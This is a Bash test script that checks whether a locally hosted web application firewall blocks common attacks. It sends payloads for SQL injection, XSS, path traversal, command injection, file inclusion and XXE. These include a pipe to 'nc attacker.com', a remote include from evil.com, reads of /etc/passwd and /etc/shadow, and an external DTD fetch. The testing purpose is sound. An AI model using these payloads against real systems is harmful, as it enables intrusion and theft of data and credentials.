#!/bin/bash

##############################################################################
# Comprehensive WAF Testing Script
# Tests all security features of the WAF Management System
# Host: localhost
##############################################################################

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
HOST="localhost"
PORT="8000"
BASE_URL="http://${HOST}:${PORT}"
ADMIN_URL="${BASE_URL}/admin"
ANALYTICS_URL="${BASE_URL}/analytics"

# Test counters
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0
BLOCKED_TESTS=0

# Log file
LOG_FILE="waf_test_results_$(date +%Y%m%d_%H%M%S).log"
echo "WAF Comprehensive Test Results - $(date)" > "$LOG_FILE"
echo "Host: $HOST" >> "$LOG_FILE"
echo "=====================================" >> "$LOG_FILE"
echo "" >> "$LOG_FILE"

##############################################################################
# Helper Functions
##############################################################################

print_header() {
    echo -e "\n${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║  $1${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}\n"
    echo "=== $1 ===" >> "$LOG_FILE"
}

print_test() {
    echo -e "${BLUE}▶ Test: $1${NC}"
    echo "Test: $1" >> "$LOG_FILE"
    ((TOTAL_TESTS++))
}

print_pass() {
    echo -e "${GREEN}✓ PASS: $1${NC}"
    echo "✓ PASS: $1" >> "$LOG_FILE"
    ((PASSED_TESTS++))
}

print_fail() {
    echo -e "${RED}✗ FAIL: $1${NC}"
    echo "✗ FAIL: $1" >> "$LOG_FILE"
    ((FAILED_TESTS++))
}

print_blocked() {
    echo -e "${YELLOW}⊗ BLOCKED: $1${NC}"
    echo "⊗ BLOCKED: $1" >> "$LOG_FILE"
    ((BLOCKED_TESTS++))
}

print_info() {
    echo -e "${PURPLE}ℹ INFO: $1${NC}"
    echo "INFO: $1" >> "$LOG_FILE"
}

test_request() {
    local description="$1"
    local url="$2"
    local method="${3:-GET}"
    local data="$4"
    local expect_block="${5:-false}"
    
    print_test "$description"
    
    if [ "$method" = "POST" ] && [ -n "$data" ]; then
        response=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$url" -d "$data" 2>&1)
    else
        response=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$url" 2>&1)
    fi
    
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    body=$(echo "$response" | sed '/HTTP_CODE:/d')
    
    echo "  URL: $url" >> "$LOG_FILE"
    echo "  Method: $method" >> "$LOG_FILE"
    echo "  HTTP Code: $http_code" >> "$LOG_FILE"
    
    if [ "$expect_block" = "true" ]; then
        if [ "$http_code" = "403" ] || echo "$body" | grep -q "blocked"; then
            print_blocked "Request correctly blocked (HTTP $http_code)"
            return 0
        else
            print_fail "Expected block but got HTTP $http_code"
            return 1
        fi
    else
        if [ "$http_code" = "200" ] || [ "$http_code" = "301" ] || [ "$http_code" = "302" ]; then
            print_pass "Request successful (HTTP $http_code)"
            return 0
        elif [ "$http_code" = "403" ]; then
            print_fail "Legitimate request was blocked (HTTP $http_code)"
            return 1
        else
            print_fail "Unexpected response (HTTP $http_code)"
            return 1
        fi
    fi
}

##############################################################################
# Test Categories
##############################################################################

test_basic_connectivity() {
    print_header "1. BASIC CONNECTIVITY TESTS"
    
    # Test 1: Homepage
    test_request "Homepage accessible" "${BASE_URL}/"
    
    # Test 2: Analytics dashboard
    test_request "Analytics dashboard" "${ANALYTICS_URL}/"
    
    # Test 3: Sites list
    test_request "Sites list page" "${BASE_URL}/sites/"
    
    # Test 4: WAF templates
    test_request "WAF templates page" "${BASE_URL}/waf-templates/"
    
    # Test 5: Logs page
    test_request "Security logs page" "${BASE_URL}/logs/"
    
    # Test 6: Caddy status
    test_request "Caddy status page" "${BASE_URL}/caddy/status/"
}

test_sql_injection() {
    print_header "2. SQL INJECTION TESTS"
    
    # Classic SQL injection attempts
    test_request "SQL Injection: OR 1=1" \
        "${BASE_URL}/?id=1' OR '1'='1" \
        "GET" "" "true"
    
    test_request "SQL Injection: UNION SELECT" \
        "${BASE_URL}/?user=admin' UNION SELECT * FROM users--" \
        "GET" "" "true"
    
    test_request "SQL Injection: DROP TABLE" \
        "${BASE_URL}/?id=1; DROP TABLE users--" \
        "GET" "" "true"
    
    test_request "SQL Injection: Comment injection" \
        "${BASE_URL}/?search=test'--" \
        "GET" "" "true"
    
    test_request "SQL Injection: Hex encoded" \
        "${BASE_URL}/?id=0x31" \
        "GET" "" "true"
    
    test_request "SQL Injection: Time-based blind" \
        "${BASE_URL}/?id=1' AND SLEEP(5)--" \
        "GET" "" "true"
}

test_xss_attacks() {
    print_header "3. CROSS-SITE SCRIPTING (XSS) TESTS"
    
    # Basic XSS attempts
    test_request "XSS: Script tag" \
        "${BASE_URL}/?name=<script>alert('XSS')</script>" \
        "GET" "" "true"
    
    test_request "XSS: Image onerror" \
        "${BASE_URL}/?img=<img src=x onerror=alert('XSS')>" \
        "GET" "" "true"
    
    test_request "XSS: JavaScript protocol" \
        "${BASE_URL}/?link=javascript:alert('XSS')" \
        "GET" "" "true"
    
    test_request "XSS: Event handler" \
        "${BASE_URL}/?data=<body onload=alert('XSS')>" \
        "GET" "" "true"
    
    test_request "XSS: SVG vector" \
        "${BASE_URL}/?svg=<svg/onload=alert('XSS')>" \
        "GET" "" "true"
    
    test_request "XSS: Encoded script" \
        "${BASE_URL}/?code=%3Cscript%3Ealert('XSS')%3C/script%3E" \
        "GET" "" "true"
}

test_path_traversal() {
    print_header "4. PATH TRAVERSAL TESTS"
    
    # Directory traversal attempts
    test_request "Path Traversal: ../../../etc/passwd" \
        "${BASE_URL}/static/../../../etc/passwd" \
        "GET" "" "true"
    
    test_request "Path Traversal: Dot-dot-slash" \
        "${BASE_URL}/files/../../secrets.txt" \
        "GET" "" "true"
    
    test_request "Path Traversal: Encoded dots" \
        "${BASE_URL}/%2e%2e%2f%2e%2e%2fpasswd" \
        "GET" "" "true"
    
    test_request "Path Traversal: Windows style" \
        "${BASE_URL}/files/..\\..\\..\\windows\\system32\\config\\sam" \
        "GET" "" "true"
    
    test_request "Path Traversal: Null byte" \
        "${BASE_URL}/../../etc/passwd%00.jpg" \
        "GET" "" "true"
}

test_command_injection() {
    print_header "5. COMMAND INJECTION TESTS"
    
    # Command injection attempts
    test_request "Command Injection: Semicolon" \
        "${BASE_URL}/?cmd=test; cat /etc/passwd" \
        "GET" "" "true"
    
    test_request "Command Injection: Pipe" \
        "${BASE_URL}/?input=data | nc attacker.com 1234" \
        "GET" "" "true"
    
    test_request "Command Injection: Backticks" \
        "${BASE_URL}/?exec=\`whoami\`" \
        "GET" "" "true"
    
    test_request "Command Injection: Dollar paren" \
        "${BASE_URL}/?run=\$(id)" \
        "GET" "" "true"
    
    test_request "Command Injection: AND operator" \
        "${BASE_URL}/?cmd=ls && cat /etc/shadow" \
        "GET" "" "true"
}

test_file_inclusion() {
    print_header "6. FILE INCLUSION TESTS"
    
    # LFI/RFI attempts
    test_request "LFI: /etc/passwd" \
        "${BASE_URL}/?file=/etc/passwd" \
        "GET" "" "true"
    
    test_request "LFI: proc/self/environ" \
        "${BASE_URL}/?page=/proc/self/environ" \
        "GET" "" "true"
    
    test_request "RFI: External PHP" \
        "${BASE_URL}/?include=http://evil.com/shell.php" \
        "GET" "" "true"
    
    test_request "LFI: PHP wrapper" \
        "${BASE_URL}/?file=php://filter/convert.base64-encode/resource=index.php" \
        "GET" "" "true"
}

test_xxe_attacks() {
    print_header "7. XML EXTERNAL ENTITY (XXE) TESTS"
    
    # XXE attempts
    test_request "XXE: External entity" \
        "${BASE_URL}/api/xml" \
        "POST" \
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
        "true"
    
    test_request "XXE: Parameter entity" \
        "${BASE_URL}/api/xml" \
        "POST" \
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>' \
        "true"
}

test_header_injection() {
    print_header "8. HEADER INJECTION TESTS"
    
    # Header injection attempts
    print_test "Header Injection: CRLF in User-Agent"
    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -H "User-Agent: Mozilla/5.0\r\nX-Injected: true" \
        "${BASE_URL}/" 2>&1)
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    
    if [ "$http_code" = "403" ]; then
        print_blocked "CRLF injection blocked"
    else
        print_fail "CRLF injection not blocked (HTTP $http_code)"
    fi
}

test_malicious_user_agents() {
    print_header "9. MALICIOUS USER-AGENT TESTS"
    
    # Scan tools and bots
    print_test "Malicious UA: Nikto scanner"
    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -H "User-Agent: Nikto/2.1.5" \
        "${BASE_URL}/" 2>&1)
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    [ "$http_code" = "403" ] && print_blocked "Nikto scanner blocked" || print_fail "Nikto not blocked"
    
    print_test "Malicious UA: SQLMap"
    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -H "User-Agent: sqlmap/1.0" \
        "${BASE_URL}/" 2>&1)
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    [ "$http_code" = "403" ] && print_blocked "SQLMap blocked" || print_fail "SQLMap not blocked"
    
    print_test "Legitimate UA: Chrome browser"
    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        "${BASE_URL}/" 2>&1)
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    [ "$http_code" = "200" ] && print_pass "Legitimate browser allowed" || print_fail "Legitimate UA blocked"
}

test_suspicious_patterns() {
    print_header "10. SUSPICIOUS PATTERN TESTS"
    
    # Various suspicious patterns
    test_request "Suspicious: eval() function" \
        "${BASE_URL}/?code=eval(base64_decode('malicious'))" \
        "GET" "" "true"
    
    test_request "Suspicious: base64 decode" \
        "${BASE_URL}/?data=base64_decode(JTNDc2NyaXB0JTNFYWxlcnQoMSklM0MlMkZzY3JpcHQlM0U=)" \
        "GET" "" "true"
    
    test_request "Suspicious: /etc/shadow access" \
        "${BASE_URL}/?file=/etc/shadow" \
        "GET" "" "true"
    
    test_request "Suspicious: phpinfo()" \
        "${BASE_URL}/?exec=phpinfo()" \
        "GET" "" "true"
}

test_rate_limiting() {
    print_header "11. RATE LIMITING TESTS"
    
    print_test "Rate Limiting: Send 20 rapid requests"
    print_info "Sending rapid requests to test rate limiting..."
    
    local blocked_count=0
    local success_count=0
    
    for i in {1..20}; do
        response=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${BASE_URL}/" 2>&1)
        http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
        
        if [ "$http_code" = "403" ]; then
            ((blocked_count++))
        elif [ "$http_code" = "200" ]; then
            ((success_count++))
        fi
        
        sleep 0.1
    done
    
    echo "  Successful: $success_count, Blocked: $blocked_count" >> "$LOG_FILE"
    
    if [ $blocked_count -gt 0 ]; then
        print_pass "Rate limiting active (blocked $blocked_count requests)"
    else
        print_info "Rate limiting may not be active or threshold not reached"
    fi
}

test_legitimate_requests() {
    print_header "12. LEGITIMATE REQUEST TESTS"
    
    # Ensure legitimate requests are not blocked
    test_request "Legitimate: Normal search query" \
        "${BASE_URL}/?search=django+web+framework"
    
    test_request "Legitimate: Pagination" \
        "${BASE_URL}/sites/?page=1"
    
    test_request "Legitimate: Filter by status" \
        "${BASE_URL}/sites/?status=active"
    
    test_request "Legitimate: Date range" \
        "${BASE_URL}/logs/?start_date=2024-01-01&end_date=2024-12-31"
    
    test_request "Legitimate: Analytics with days parameter" \
        "${ANALYTICS_URL}/?days=7"
}

test_api_endpoints() {
    print_header "13. API ENDPOINT TESTS"
    
    # Test API endpoints
    test_request "API: Geographic data" \
        "${BASE_URL}/api/analytics/test-lock/geographic/"
    
    test_request "API: Timeline data" \
        "${BASE_URL}/api/analytics/test-lock/timeline/"
    
    test_request "API: Top IPs" \
        "${BASE_URL}/api/analytics/test-lock/top-ips/"
    
    test_request "API: Request methods" \
        "${BASE_URL}/api/analytics/test-lock/methods/"
}

test_unicode_attacks() {
    print_header "14. UNICODE & ENCODING TESTS"
    
    # Unicode-based attacks
    test_request "Unicode: Script tag" \
        "${BASE_URL}/?xss=%u003cscript%u003ealert(1)%u003c/script%u003e" \
        "GET" "" "true"
    
    test_request "Double encoding: Script" \
        "${BASE_URL}/?xss=%253Cscript%253Ealert(1)%253C%252Fscript%253E" \
        "GET" "" "true"
    
    test_request "UTF-8 overlong: Slash" \
        "${BASE_URL}/%C0%AF" \
        "GET" "" "true"
}

test_http_method_abuse() {
    print_header "15. HTTP METHOD ABUSE TESTS"
    
    # Test various HTTP methods
    print_test "HTTP Method: TRACE"
    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X TRACE "${BASE_URL}/" 2>&1)
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    [ "$http_code" = "405" ] || [ "$http_code" = "403" ] && print_pass "TRACE method blocked" || print_fail "TRACE allowed"
    
    print_test "HTTP Method: DELETE on protected resource"
    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X DELETE "${BASE_URL}/sites/1/" 2>&1)
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    [ "$http_code" = "403" ] || [ "$http_code" = "405" ] && print_pass "Unauthorized DELETE blocked" || print_fail "DELETE allowed"
}

test_special_cases() {
    print_header "16. SPECIAL EDGE CASES"
    
    # Very long URL
    test_request "Edge Case: Extremely long URL" \
        "${BASE_URL}/?$(printf 'a%.0s' {1..10000})" \
        "GET" "" "true"
    
    # Null bytes
    test_request "Edge Case: Null byte in parameter" \
        "${BASE_URL}/?file=test%00.txt" \
        "GET" "" "true"
    
    # Mixed case evasion
    test_request "Edge Case: Mixed case SQL" \
        "${BASE_URL}/?id=1' UnIoN SeLeCt * FrOm users--" \
        "GET" "" "true"
}

##############################################################################
# Main Test Execution
##############################################################################

main() {
    echo -e "${GREEN}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║                                                               ║"
    echo "║      WAF COMPREHENSIVE SECURITY TEST SUITE                    ║"
    echo "║      Host: $HOST                                       ║"
    echo "║      $(date)                            ║"
    echo "║                                                               ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}\n"
    
    print_info "Starting comprehensive WAF tests..."
    print_info "All results will be logged to: $LOG_FILE"
    echo ""
    
    # Run all test categories
    test_basic_connectivity
    test_sql_injection
    test_xss_attacks
    test_path_traversal
    test_command_injection
    test_file_inclusion
    test_xxe_attacks
    test_header_injection
    test_malicious_user_agents
    test_suspicious_patterns
    test_rate_limiting
    test_legitimate_requests
    test_api_endpoints
    test_unicode_attacks
    test_http_method_abuse
    test_special_cases
    
    # Print summary
    print_summary
}

print_summary() {
    echo -e "\n${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                    TEST SUMMARY                               ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${BLUE}Total Tests:     ${NC}$TOTAL_TESTS"
    echo -e "${GREEN}Passed:          ${NC}$PASSED_TESTS"
    echo -e "${RED}Failed:          ${NC}$FAILED_TESTS"
    echo -e "${YELLOW}Blocked:         ${NC}$BLOCKED_TESTS"
    
    # Calculate success rate
    if [ $TOTAL_TESTS -gt 0 ]; then
        success_rate=$(( (PASSED_TESTS + BLOCKED_TESTS) * 100 / TOTAL_TESTS ))
        echo -e "${PURPLE}Success Rate:    ${NC}${success_rate}%"
    fi
    
    echo ""
    echo -e "${CYAN}Detailed results saved to: ${NC}$LOG_FILE"
    
    # Summary to log file
    echo "" >> "$LOG_FILE"
    echo "=====================================" >> "$LOG_FILE"
    echo "TEST SUMMARY" >> "$LOG_FILE"
    echo "=====================================" >> "$LOG_FILE"
    echo "Total Tests: $TOTAL_TESTS" >> "$LOG_FILE"
    echo "Passed: $PASSED_TESTS" >> "$LOG_FILE"
    echo "Failed: $FAILED_TESTS" >> "$LOG_FILE"
    echo "Blocked (Security Working): $BLOCKED_TESTS" >> "$LOG_FILE"
    
    # Final status
    echo ""
    if [ $FAILED_TESTS -eq 0 ]; then
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                 ALL TESTS COMPLETED SUCCESSFULLY!              ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
    else
        echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║              SOME TESTS FAILED - REVIEW RESULTS                ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
    fi
    
    echo ""
}

##############################################################################
# Execute
##############################################################################

# Check if curl is installed
if ! command -v curl &> /dev/null; then
    echo -e "${RED}Error: curl is not installed. Please install curl first.${NC}"
    exit 1
fi

# Run main function
main

exit 0

